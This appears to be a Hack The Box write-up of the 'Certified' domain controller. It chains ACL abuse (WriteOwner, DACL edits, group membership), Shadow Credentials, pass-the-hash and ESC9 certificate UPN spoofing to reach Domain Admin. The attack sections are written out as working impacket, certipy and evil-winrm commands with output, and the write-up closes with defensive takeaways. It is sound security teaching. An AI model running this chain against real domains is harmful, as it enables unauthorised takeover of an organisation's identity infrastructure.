---
title: "HTB: Certified · from WriteOwner to Domain Admin by chaining ACLs, Shadow Credentials and ESC9"
date: 2026-09-12
draft: false
tags: ["hackthebox", "active-directory", "windows", "adcs", "privilege-escalation", "certipy", "bloodhound"]
summary: "An assumed-breach box with not a single software vulnerability in sight: the whole domain falls through five badly delegated permissions and one certificate template missing a security extension, chained together to turn an ordinary user into Domain Administrator."
---

## Overview

Certified is a retired medium-difficulty Windows Domain Controller from Hack The Box, and it is the box that best illustrates something that takes a while to internalise when you come from the exploit world: in a real Active Directory you almost never need a CVE. Nothing outdated gets exploited here, there is no buffer overflow, and not a single password gets cracked. The entire domain compromise is built on permissions somebody delegated badly and one misconfigured certificate template.

This is an *assumed breach* box: the brief hands you unprivileged user credentials, exactly as if an employee had fallen for a phishing email. From there, the chain is:

1. **`WriteOwner` over a group.** The starting user can change the owner of the `Management` group, and in AD the owner of an object can always rewrite its permissions.
2. **Ownership takeover and self-granted rights.** Become the owner, grant yourself `FullControl` over the group, then add yourself as a member.
3. **Permission inheritance through group membership.** The `Management` group holds `GenericWrite` over the `management_svc` service account, so joining the group inherits that right.
4. **Shadow Credentials.** With `GenericWrite` over an account you can inject a fake certificate credential and authenticate as that account over Kerberos PKINIT without knowing its password, recovering its NTLM hash along the way. This yields the user flag over WinRM.
5. **A second ACL hop and ESC9.** `management_svc` holds `GenericAll` over `ca_operator`, and `ca_operator` can enrol in a certificate template missing the security extension that binds a certificate to a specific SID. Spoofing the UPN yields a certificate valid for the domain Administrator.

Target: `10.129.231.186`, a Domain Controller for the `certified.htb` domain, running Active Directory Certificate Services (AD CS).

## Enumeration

Full TCP scan with default scripts and version detection:

```bash
nmap -sC -sV -p- -oN nmap-certified.txt 10.129.231.186
```

The result is the identikit picture of a modern Domain Controller: DNS, Kerberos, RPC, NetBIOS, LDAP and LDAPS, SMB, the global catalog on 3268 and 3269, WinRM on 5985 and the AD web service on 9389. No port 80, nothing web-facing to poke at.

First move, as always, is checking whether anonymous access works anywhere:

```bash
rpcclient -U "" -N 10.129.231.186 -c enumdomusers
ldapsearch -x -H ldap://10.129.231.186 -s base namingcontexts
```

This is where the box parts ways with classics like Cascade: the RPC null session is established, but **every** query returns `ACCESS_DENIED`, and the anonymous LDAP bind is rejected outright. `enum4linux-ng` confirms the same wall. That is not a failure of the technique, it is the correct and default configuration on a modern Windows Server, and it is the signal that this box is not meant to be entered blind.

Going back to the machine brief turns up the missing piece, a set of starting credentials:

```
judith.mader : judith09
```

This is what a real engagement calls an assumed-breach scenario. You are not assessing whether an attacker can obtain credentials, you assume they already have them (phishing, a leak, password reuse) and you measure **how far they can get from there**. It is by far the most realistic scenario, and the one most often contracted.

## Authenticated reconnaissance

With valid credentials the picture changes completely:

```bash
netexec smb 10.129.231.186 -u judith.mader -p judith09 --shares
```

Only `SYSVOL` and `NETLOGON`, both readable. They are worth a look, since logon scripts and group policies are a classic place for leaked passwords (`cpassword` in GPO preferences), but here there is only the default domain policy with nothing usable. The one useful detail in `GptTmpl.inf` turns out to be prophetic for the rest of the box:

```
MaxClockSkew = 5
```

The domain only tolerates five minutes of Kerberos clock skew. Hold that thought.

Next, hunting for Kerberoastable accounts:

```bash
impacket-GetUserSPNs certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186
```

`management_svc` shows up, a service account with a registered SPN and a member of the `Management` group. An interesting target, although the TGS hash it yields does not fall to `rockyou`, so the cracking route ends there. What matters is the detail glimpsed in passing: a group called `Management` exists, and the service account belongs to it.

## BloodHound and ACL analysis without a GUI

When classic enumeration dries up, the next step in Active Directory is not to look for more services, it is to look for **permission relationships**. BloodHound collects every user, group, computer and GPO in the domain along with their access control lists, and surfaces escalation paths no port scan would ever show.

```bash
bloodhound-python -u judith.mader -p judith09 -d certified.htb -ns 10.129.231.186 -c All --zip
```

The `-d` and `-ns` flags are not optional here: without them the tool tries to resolve the domain through the system resolver, which does not point at the Domain Controller, and blows up with `dns.name.EmptyLabel`.

You do not need to stand up Neo4j to get value out of those JSON files. `jq` answers the same questions. First, the SID of the user we control:

```bash
jq -r '.data[] | select(.Properties.samaccountname=="judith.mader") | .ObjectIdentifier' *_users.json
```

Then every right that SID holds over any object in the domain:

```bash
SID="S-1-5-21-729746778-2675978091-3820388244-1103"

jq -r --arg sid "$SID" '
  .data[] |
  (.Properties.name // .Properties.samaccountname // .ObjectIdentifier) as $target |
  (.Aces // [])[] |
  select(.PrincipalSID == $sid) |
  "\(.RightName)\t-> \($target)"
' *.json
```

Result:

```
WriteOwner  -> MANAGEMENT@CERTIFIED.HTB
```

Repeating the query with the `Management` group's own SID reveals the second half of the path:

```
GenericWrite -> MANAGEMENT_SVC@CERTIFIED.HTB
```

The full chain is now drawn out: `judith.mader` controls the `Management` group, and the `Management` group controls the `management_svc` account.

## ACL abuse · ownership, DACL and membership

It is worth understanding why `WriteOwner` is so serious, because it is not intuitive. In Active Directory, the owner of an object can **always** modify that object's permission list, whether or not an explicit right says so. Being able to change the owner is therefore equivalent to being able to grant yourself any permission later. It is the difference between holding the key to an office and owning the building: the owner can always cut themselves whichever key they want.

The abuse is three steps. First, take ownership of the group:

```bash
impacket-owneredit -action write -new-owner judith.mader -target Management \
  certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186
```

Second, as the owner, grant yourself full control over it:

```bash
impacket-dacledit -action write -rights FullControl -principal judith.mader -target Management \
  certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186
```

Third, with full control, add yourself as a member:

```bash
net rpc group addmem "Management" "judith.mader" \
  -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
```

And here comes an operational lesson that cost real time: **always verify, never assume**. The first DACL write appeared to go through but never applied, and the failure only surfaced at the `addmem` step, which returned `NT_STATUS_ACCESS_DENIED`. Impacket tools can fail silently. After each step, read the actual state back:

```bash
impacket-owneredit -action read -target Management certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186
impacket-dacledit -action read -principal judith.mader -target Management certified.htb/judith.mader:judith09 -dc-ip 10.129.231.186
net rpc group members "Management" -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.231.186
```

With membership confirmed, the `GenericWrite` over `management_svc` is inherited. The mechanism deserves emphasis, because this pattern recurs constantly in AD: permissions are not evaluated by looking at your account alone, they are evaluated against **every SID you carry**, including one for each group you belong to. Joining a group means inheriting, all at once, everything that group can do.

## Shadow Credentials · authenticating without the password

`GenericWrite` over a user account allows writing its attributes, and one of those attributes is `msDS-KeyCredentialLink`, the field Windows Hello for Business uses to bind a public key to an account. If you can write there, you can register **your own** key pair as a valid authentication method for that account, request a TGT over Kerberos PKINIT with your certificate, and recover the victim's NTLM hash in the process. Without touching their password, without anyone noticing, and without leaving the account broken.

```bash
certipy-ad shadow auto -u judith.mader@certified.htb -p judith09 \
  -account management_svc -dc-ip 10.129.231.186
```

This is where that `MaxClockSkew = 5` collects its debt. Kerberos rejects any ticket whose timestamps drift more than five minutes from the Domain Controller's, and the lab clock is offset from real time:

```
KRB_AP_ERR_SKEW(Clock skew too great)
```

The fix is not just to sync, it is to **stop re-syncing**: on Kali, `systemd-timesyncd` keeps pulling the clock back to real time, fighting the lab clock. Disable it first and fire the command immediately after, all in one go:

```bash
sudo timedatectl set-ntp false
sudo net time set -S 10.129.231.186
certipy-ad shadow auto -u judith.mader@certified.htb -p judith09 -account management_svc -dc-ip 10.129.231.186
```

```
[*] Got TGT
[*] NT hash for 'management_svc': a091c1832bcdd46...
```

That NTLM hash does not need cracking. It is a very common mistake (and yes, I burned time throwing `hashcat` and `john` at it): for NTLM authentication purposes, the hash **is** the credential. Use it directly:

```bash
evil-winrm -i 10.129.231.186 -u management_svc -H a091c1832bcdd46...
```

User flag captured.

## Post-exploitation · the next link

Inside, `whoami /all` gives the context:

```
CERTIFIED\Management                        Group
BUILTIN\Remote Management Users             Alias
BUILTIN\Certificate Service DCOM Access     Alias
```

No juicy privileges (`SeImpersonate` is absent), no stored credentials in `cmdkey /list`, and the rest of the disk denied. But `Certificate Service DCOM Access` is a very clear hint about where this box is going, and the box name is the other one.

Repeating the same ACL analysis with `management_svc`'s SID reveals the next hop:

```
GenericAll -> CA_OPERATOR@CERTIFIED.HTB
```

`GenericAll` is full control, so the Shadow Credentials attack repeats identically, this time aimed at `ca_operator`:

```bash
certipy-ad shadow auto -u management_svc@certified.htb -hashes a091c1832bcdd46... \
  -account ca_operator -dc-ip 10.129.231.186
```

New hash, new account. WinRM with it fails (`WinRMAuthorizationError`), because `ca_operator` is not in the remote access group. That does not matter: its value is not a shell, it is its role inside the certificate infrastructure.

## AD CS and ESC9 · a certificate with no return address

Active Directory Certificate Services (AD CS) is, in essence, the domain's digital ID card office. The certificates it issues can be used to authenticate on the network exactly like a password, and which certificates can be requested, and by whom, is defined by **certificate templates**.

Enumeration with `certipy-ad find` authenticated as `management_svc` finds nothing. Run as `ca_operator`, everything changes:

```bash
certipy-ad find -u ca_operator@certified.htb -hashes <ca_operator_hash> \
  -dc-ip 10.129.231.186 -vulnerable
```

```
Template Name             : CertifiedAuthentication
Enrollment Flag           : PublishToDs, AutoEnrollment, NoSecurityExtension
Extended Key Usage        : Server Authentication, Client Authentication
Enrollment Rights         : CERTIFIED.HTB\operator ca
[!] Vulnerabilities
  ESC9                    : Template has no security extension.
```

This is ESC9. Normally an authentication certificate embeds an extension (`szOID_NTDS_CA_SECURITY_EXT`) recording the holder's SID, so the Domain Controller can strongly verify which account a certificate belongs to. The `NoSecurityExtension` flag strips that check, and the KDC then falls back to the weak method: mapping the certificate to whichever account matches the UPN written inside it.

And the UPN is an account attribute, writable by anyone who controls that account. Since `management_svc` holds `GenericAll` over `ca_operator`, you can rewrite `ca_operator`'s UPN to read `administrator`, request the certificate under that borrowed identity, and put the attribute back afterwards:

```bash
# 1. spoof the UPN
certipy-ad account update -u management_svc@certified.htb -hashes <management_svc_hash> \
  -user ca_operator -upn administrator -dc-ip 10.129.231.186

# 2. request the certificate as ca_operator, with the spoofed UPN in place
certipy-ad req -u ca_operator@certified.htb -hashes <ca_operator_hash> \
  -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.129.231.186

# 3. restore the original UPN
certipy-ad account update -u management_svc@certified.htb -hashes <management_svc_hash> \
  -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.231.186
```

The resulting certificate is saved straight to `administrator.pfx`, which rather gives away the ending. Using it to authenticate, the KDC maps it to the account you would expect:

```bash
certipy-ad auth -pfx /home/kali/administrator.pfx -dc-ip 10.129.231.186 -domain certified.htb
```

```
[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Got TGT
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b4960...
```

Pass the hash one final time:

```bash
evil-winrm -i 10.129.231.186 -u administrator -H 0d5b4960...
```

Root flag captured. Full domain compromise.

## Takeaways

What makes Certified interesting is that no patch would have prevented any of this. These are configuration decisions:

- **`WriteOwner` is equivalent to full control, just with an extra step.** Any permission audit treating `WriteOwner` as a minor right is misclassifying the risk. The owner of an AD object can always rewrite its own permissions.
- **Permissions are inherited through groups, and whoever can join a group inherits everything that group can do.** Delegating to groups is convenient to administer and dangerous when somebody can alter membership.
- **`msDS-KeyCredentialLink` must be treated as a critical attribute.** Being able to write it is equivalent to being able to impersonate the whole account. If Windows Hello for Business is not in use, nobody below administrator should be able to write that attribute.
- **A certificate template with `NoSecurityExtension` breaks the strong binding between certificate and account.** Combined with write access to the UPN of any account that can enrol, it becomes a direct path to Domain Admin. Real mitigation means removing that flag and enforcing strong certificate mapping (KB5014754).
- **AD CS is first-class attack surface and it almost never gets audited.** A misconfigured CA is not an application problem, it is a problem for the entire identity fabric of the domain.

*Flags are partially redacted, by convention.*
